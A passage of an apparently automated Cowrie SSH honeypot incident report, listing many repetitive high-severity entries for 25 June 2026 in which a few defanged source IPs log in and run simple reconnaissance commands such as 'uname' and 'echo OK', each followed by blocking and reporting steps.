| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:14:25` | `cowrie.session.connect` |
| `2026-06-25 17:14:25` | `cowrie.client.version` |
| `2026-06-25 17:14:25` | `cowrie.client.kex` |
| `2026-06-25 17:14:25` | `cowrie.login.success` |
| `2026-06-25 17:14:26` | `cowrie.session.params` |
| `2026-06-25 17:14:26` | `cowrie.command.input` |
| `2026-06-25 17:14:26` | `cowrie.log.closed` |
| `2026-06-25 17:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e242041e46

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:15 |
| **Last Seen** | 2026-06-25 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:15:18` | `cowrie.session.connect` |
| `2026-06-25 17:15:18` | `cowrie.client.version` |
| `2026-06-25 17:15:18` | `cowrie.client.kex` |
| `2026-06-25 17:15:18` | `cowrie.login.success` |
| `2026-06-25 17:15:19` | `cowrie.session.params` |
| `2026-06-25 17:15:19` | `cowrie.command.input` |
| `2026-06-25 17:15:19` | `cowrie.log.closed` |
| `2026-06-25 17:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea71d16de6ec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:16 |
| **Last Seen** | 2026-06-25 17:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:16:12` | `cowrie.session.connect` |
| `2026-06-25 17:16:12` | `cowrie.client.version` |
| `2026-06-25 17:16:12` | `cowrie.client.kex` |
| `2026-06-25 17:16:12` | `cowrie.login.success` |
| `2026-06-25 17:16:13` | `cowrie.session.params` |
| `2026-06-25 17:16:13` | `cowrie.command.input` |
| `2026-06-25 17:16:13` | `cowrie.log.closed` |
| `2026-06-25 17:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e048aa25846

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:17 |
| **Last Seen** | 2026-06-25 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:17:09` | `cowrie.session.connect` |
| `2026-06-25 17:17:09` | `cowrie.client.version` |
| `2026-06-25 17:17:09` | `cowrie.client.kex` |
| `2026-06-25 17:17:10` | `cowrie.login.success` |
| `2026-06-25 17:17:10` | `cowrie.session.params` |
| `2026-06-25 17:17:10` | `cowrie.command.input` |
| `2026-06-25 17:17:10` | `cowrie.log.closed` |
| `2026-06-25 17:17:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de9a8d623cd4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:18 |
| **Last Seen** | 2026-06-25 17:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:18:05` | `cowrie.session.connect` |
| `2026-06-25 17:18:05` | `cowrie.client.version` |
| `2026-06-25 17:18:06` | `cowrie.client.kex` |
| `2026-06-25 17:18:06` | `cowrie.login.success` |
| `2026-06-25 17:18:07` | `cowrie.session.params` |
| `2026-06-25 17:18:07` | `cowrie.command.input` |
| `2026-06-25 17:18:07` | `cowrie.log.closed` |
| `2026-06-25 17:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712e23d27acd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:19 |
| **Last Seen** | 2026-06-25 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:19:01` | `cowrie.session.connect` |
| `2026-06-25 17:19:01` | `cowrie.client.version` |
| `2026-06-25 17:19:01` | `cowrie.client.kex` |
| `2026-06-25 17:19:01` | `cowrie.login.success` |
| `2026-06-25 17:19:02` | `cowrie.session.params` |
| `2026-06-25 17:19:02` | `cowrie.command.input` |
| `2026-06-25 17:19:02` | `cowrie.log.closed` |
| `2026-06-25 17:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c73443fc144

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:19 |
| **Last Seen** | 2026-06-25 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:19:57` | `cowrie.session.connect` |
| `2026-06-25 17:19:57` | `cowrie.client.version` |
| `2026-06-25 17:19:57` | `cowrie.client.kex` |
| `2026-06-25 17:19:57` | `cowrie.login.success` |
| `2026-06-25 17:19:58` | `cowrie.session.params` |
| `2026-06-25 17:19:58` | `cowrie.command.input` |
| `2026-06-25 17:19:58` | `cowrie.log.closed` |
| `2026-06-25 17:19:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-307b1d743d0e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:20 |
| **Last Seen** | 2026-06-25 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:20:53` | `cowrie.session.connect` |
| `2026-06-25 17:20:53` | `cowrie.client.version` |
| `2026-06-25 17:20:53` | `cowrie.client.kex` |
| `2026-06-25 17:20:53` | `cowrie.login.success` |
| `2026-06-25 17:20:54` | `cowrie.session.params` |
| `2026-06-25 17:20:54` | `cowrie.command.input` |
| `2026-06-25 17:20:54` | `cowrie.log.closed` |
| `2026-06-25 17:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df317c74e7f3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:21 |
| **Last Seen** | 2026-06-25 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:21:49` | `cowrie.session.connect` |
| `2026-06-25 17:21:49` | `cowrie.client.version` |
| `2026-06-25 17:21:50` | `cowrie.client.kex` |
| `2026-06-25 17:21:50` | `cowrie.login.success` |
| `2026-06-25 17:21:51` | `cowrie.session.params` |
| `2026-06-25 17:21:51` | `cowrie.command.input` |
| `2026-06-25 17:21:51` | `cowrie.log.closed` |
| `2026-06-25 17:21:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cde2ea063a5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 17:22 |
| **Last Seen** | 2026-06-25 17:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:22:22` | `cowrie.session.connect` |
| `2026-06-25 17:22:22` | `cowrie.client.version` |
| `2026-06-25 17:22:22` | `cowrie.client.kex` |
| `2026-06-25 17:22:24` | `cowrie.login.success` |
| `2026-06-25 17:22:26` | `cowrie.session.params` |
| `2026-06-25 17:22:26` | `cowrie.command.input` |
| `2026-06-25 17:22:26` | `cowrie.log.closed` |
| `2026-06-25 17:22:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d28e815f229a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:22 |
| **Last Seen** | 2026-06-25 17:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:22:47` | `cowrie.session.connect` |
| `2026-06-25 17:22:47` | `cowrie.client.version` |
| `2026-06-25 17:22:47` | `cowrie.client.kex` |
| `2026-06-25 17:22:48` | `cowrie.login.success` |
| `2026-06-25 17:22:49` | `cowrie.session.params` |
| `2026-06-25 17:22:49` | `cowrie.command.input` |
| `2026-06-25 17:22:49` | `cowrie.log.closed` |
| `2026-06-25 17:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37b738bc3f8a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 17:22 |
| **Last Seen** | 2026-06-25 17:22 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:22:48` | `cowrie.session.connect` |
| `2026-06-25 17:22:49` | `cowrie.client.version` |
| `2026-06-25 17:22:49` | `cowrie.client.kex` |
| `2026-06-25 17:22:55` | `cowrie.login.success` |
| `2026-06-25 17:22:58` | `cowrie.session.params` |
| `2026-06-25 17:22:58` | `cowrie.command.input` |
| `2026-06-25 17:22:59` | `cowrie.log.closed` |
| `2026-06-25 17:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e7449ad4d3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:23 |
| **Last Seen** | 2026-06-25 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:23:42` | `cowrie.session.connect` |
| `2026-06-25 17:23:42` | `cowrie.client.version` |
| `2026-06-25 17:23:42` | `cowrie.client.kex` |
| `2026-06-25 17:23:42` | `cowrie.login.success` |
| `2026-06-25 17:23:43` | `cowrie.session.params` |
| `2026-06-25 17:23:43` | `cowrie.command.input` |
| `2026-06-25 17:23:43` | `cowrie.log.closed` |
| `2026-06-25 17:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a51536ad931b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:24 |
| **Last Seen** | 2026-06-25 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:24:40` | `cowrie.session.connect` |
| `2026-06-25 17:24:40` | `cowrie.client.version` |
| `2026-06-25 17:24:40` | `cowrie.client.kex` |
| `2026-06-25 17:24:40` | `cowrie.login.success` |
| `2026-06-25 17:24:41` | `cowrie.session.params` |
| `2026-06-25 17:24:41` | `cowrie.command.input` |
| `2026-06-25 17:24:41` | `cowrie.log.closed` |
| `2026-06-25 17:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce6280ba852a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:25 |
| **Last Seen** | 2026-06-25 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:25:38` | `cowrie.session.connect` |
| `2026-06-25 17:25:38` | `cowrie.client.version` |
| `2026-06-25 17:25:38` | `cowrie.client.kex` |
| `2026-06-25 17:25:38` | `cowrie.login.success` |
| `2026-06-25 17:25:39` | `cowrie.session.params` |
| `2026-06-25 17:25:39` | `cowrie.command.input` |
| `2026-06-25 17:25:39` | `cowrie.log.closed` |
| `2026-06-25 17:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483ac06083d4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:26 |
| **Last Seen** | 2026-06-25 17:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:26:36` | `cowrie.session.connect` |
| `2026-06-25 17:26:36` | `cowrie.client.version` |
| `2026-06-25 17:26:36` | `cowrie.client.kex` |
| `2026-06-25 17:26:36` | `cowrie.login.success` |
| `2026-06-25 17:26:38` | `cowrie.session.params` |
| `2026-06-25 17:26:38` | `cowrie.command.input` |
| `2026-06-25 17:26:38` | `cowrie.log.closed` |
| `2026-06-25 17:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d41b00ea61f4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:27 |
| **Last Seen** | 2026-06-25 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:27:35` | `cowrie.session.connect` |
| `2026-06-25 17:27:35` | `cowrie.client.version` |
| `2026-06-25 17:27:35` | `cowrie.client.kex` |
| `2026-06-25 17:27:35` | `cowrie.login.success` |
| `2026-06-25 17:27:36` | `cowrie.session.params` |
| `2026-06-25 17:27:36` | `cowrie.command.input` |
| `2026-06-25 17:27:36` | `cowrie.log.closed` |
| `2026-06-25 17:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e811ff5f4d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:28 |
| **Last Seen** | 2026-06-25 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:28:32` | `cowrie.session.connect` |
| `2026-06-25 17:28:32` | `cowrie.client.version` |
| `2026-06-25 17:28:32` | `cowrie.client.kex` |
| `2026-06-25 17:28:32` | `cowrie.login.success` |
| `2026-06-25 17:28:33` | `cowrie.session.params` |
| `2026-06-25 17:28:33` | `cowrie.command.input` |
| `2026-06-25 17:28:33` | `cowrie.log.closed` |
| `2026-06-25 17:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b24d1992f57

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:29 |
| **Last Seen** | 2026-06-25 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:29:30` | `cowrie.session.connect` |
| `2026-06-25 17:29:30` | `cowrie.client.version` |
| `2026-06-25 17:29:30` | `cowrie.client.kex` |
| `2026-06-25 17:29:30` | `cowrie.login.success` |
| `2026-06-25 17:29:31` | `cowrie.session.params` |
| `2026-06-25 17:29:31` | `cowrie.command.input` |
| `2026-06-25 17:29:31` | `cowrie.log.closed` |
| `2026-06-25 17:29:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22fa0a5aefef

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:30 |
| **Last Seen** | 2026-06-25 17:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:30:30` | `cowrie.session.connect` |
| `2026-06-25 17:30:30` | `cowrie.client.version` |
| `2026-06-25 17:30:30` | `cowrie.client.kex` |
| `2026-06-25 17:30:31` | `cowrie.login.success` |
| `2026-06-25 17:30:31` | `cowrie.session.params` |
| `2026-06-25 17:30:31` | `cowrie.command.input` |
| `2026-06-25 17:30:31` | `cowrie.log.closed` |
| `2026-06-25 17:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c203f0c8a5c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:31 |
| **Last Seen** | 2026-06-25 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:31:32` | `cowrie.session.connect` |
| `2026-06-25 17:31:32` | `cowrie.client.version` |
| `2026-06-25 17:31:32` | `cowrie.client.kex` |
| `2026-06-25 17:31:32` | `cowrie.login.success` |
| `2026-06-25 17:31:33` | `cowrie.session.params` |
| `2026-06-25 17:31:33` | `cowrie.command.input` |
| `2026-06-25 17:31:33` | `cowrie.log.closed` |
| `2026-06-25 17:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54a9b07daed1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:32 |
| **Last Seen** | 2026-06-25 17:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:32:30` | `cowrie.session.connect` |
| `2026-06-25 17:32:30` | `cowrie.client.version` |
| `2026-06-25 17:32:30` | `cowrie.client.kex` |
| `2026-06-25 17:32:30` | `cowrie.login.success` |
| `2026-06-25 17:32:31` | `cowrie.session.params` |
| `2026-06-25 17:32:31` | `cowrie.command.input` |
| `2026-06-25 17:32:31` | `cowrie.log.closed` |
| `2026-06-25 17:32:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d03b19c3b0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:33 |
| **Last Seen** | 2026-06-25 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:33:27` | `cowrie.session.connect` |
| `2026-06-25 17:33:27` | `cowrie.client.version` |
| `2026-06-25 17:33:27` | `cowrie.client.kex` |
| `2026-06-25 17:33:28` | `cowrie.login.success` |
| `2026-06-25 17:33:29` | `cowrie.session.params` |
| `2026-06-25 17:33:29` | `cowrie.command.input` |
| `2026-06-25 17:33:29` | `cowrie.log.closed` |
| `2026-06-25 17:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e8a9abd244

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:34 |
| **Last Seen** | 2026-06-25 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:34:24` | `cowrie.session.connect` |
| `2026-06-25 17:34:24` | `cowrie.client.version` |
| `2026-06-25 17:34:24` | `cowrie.client.kex` |
| `2026-06-25 17:34:24` | `cowrie.login.success` |
| `2026-06-25 17:34:25` | `cowrie.session.params` |
| `2026-06-25 17:34:25` | `cowrie.command.input` |
| `2026-06-25 17:34:25` | `cowrie.log.closed` |
| `2026-06-25 17:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cf1f4c9b6f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 17:34 |
| **Last Seen** | 2026-06-25 17:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:34:33` | `cowrie.session.connect` |
| `2026-06-25 17:34:34` | `cowrie.client.version` |
| `2026-06-25 17:34:34` | `cowrie.client.kex` |
| `2026-06-25 17:34:40` | `cowrie.login.success` |
| `2026-06-25 17:34:44` | `cowrie.session.params` |
| `2026-06-25 17:34:44` | `cowrie.command.input` |
| `2026-06-25 17:34:46` | `cowrie.log.closed` |
| `2026-06-25 17:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32dec4fe9121

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 17:35 |
| **Last Seen** | 2026-06-25 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 17:35:21` | `cowrie.session.connect` |
| `2026-06-25 17:35:21` | `cowrie.client.version` |
| `2026-06-25 17:35:21` | `cowrie.client.kex` |
| `2026-06-25 17:35:21` | `cowrie.login.success` |
| `2026-06-25 17:35:22` | `cowrie.session.params` |
| `2026-06-25 17:35:22` | `cowrie.command.input` |
| `2026-06-25 17:35:22` | `cowrie.log.closed` |
| `2026-06-25 17:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
